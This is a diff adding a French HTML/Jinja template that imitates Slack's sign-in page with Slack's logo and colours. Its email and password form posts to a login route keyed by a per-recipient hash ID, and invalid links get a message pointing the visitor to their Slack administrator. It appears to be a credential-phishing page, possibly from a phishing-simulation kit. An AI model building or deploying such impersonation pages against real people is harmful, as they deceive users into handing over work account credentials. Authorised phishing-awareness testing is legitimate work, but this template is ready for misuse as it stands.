@@ -1,0 +1,102 @@
+
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Slack</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f8f9fa;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+
+        .logo {
+            margin-bottom: 40px;
+            height: 44px;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+            padding: 0 20px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: #1d1c1d;
+            margin-bottom: 8px;
+            line-height: 1.1;
+        }
+
+        .subtitle {
+            color: #616061;
+            margin-bottom: 40px;
+            font-size: 1rem;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d4d9de;
+            border-radius: 4px;
+            font-size: 1rem;
+            margin-bottom: 16px;
+            box-sizing: border-box;
+        }
+
+        .email-input:focus {
+            outline: none;
+            border-color: #1264a3;
+            box-shadow: 0 0 0 2px rgba(74, 135, 180, 0.3);
+        }
+
+        .signin-button {
+            width: 100%;
+            background-color: #4a154b;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .signin-button:hover {
+            background-color: #3a0f3d;
+        }
+    </style>
+</head>
+<body>
+        {% if hash_id %}
+    <div class="container">
+        <img src="https://a.slack-edge.com/bv1-13/slack_logo-ebd02d1.svg" alt="Logo Slack" class="logo">
+
+        <h1>Saisissez votre email<br>pour vous connecter</h1>
+
+        <p class="subtitle">Ou choisissez une autre méthode de connexion.</p>
+        <form action="{{ url_for('login', id=hash_id) }}" method="post">
+            <input type="email" class="email-input" placeholder="nom@email-pro.com" required>
+            <input type="password" class="email-input" placeholder="••••••••" required>
+
+        <button class="signin-button" type="submit">Se connecter avec un email</button>
+        </form>
+              {% else %}
+        <div class="invalid">
+          <h1>Lien invalide</h1>
+          <p>Ce lien ne semble plus actif. Merci de contacter votre administrateur Slack pour obtenir un nouvel accès.</p>
+        </div>
+      {% endif %}
+    </div>
+</body>
+</html>
